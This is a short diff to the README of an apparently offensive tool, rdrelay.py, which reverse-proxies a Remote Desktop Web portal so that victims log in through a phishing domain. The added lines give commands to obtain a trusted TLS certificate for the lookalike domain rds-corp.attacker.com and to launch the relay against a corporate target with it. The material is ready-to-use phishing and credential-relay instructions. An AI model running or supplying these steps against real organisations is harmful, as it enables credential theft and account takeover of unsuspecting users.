@@ -54,8 +54,15 @@ Reverse-proxies an RDWeb portal. Victim logs in through the phishing domain, RDR
 
 With a real cert:
 
+Generate a cert (DNS record must point to your box):
+
 ```
-./rdrelay.py --target https://rds.corp.com --phish-domain rds-corp.attacker.com --cert fullchain.pem
+certbot certonly --standalone -d rds-corp.attacker.com
+cat /etc/letsencrypt/live/rds-corp.attacker.com/{fullchain,privkey}.pem > cert.pem
+```
+
+```
+./rdrelay.py --target https://rds.corp.com --phish-domain rds-corp.attacker.com --cert cert.pem
 ```
 
 Lab testing without TLS:
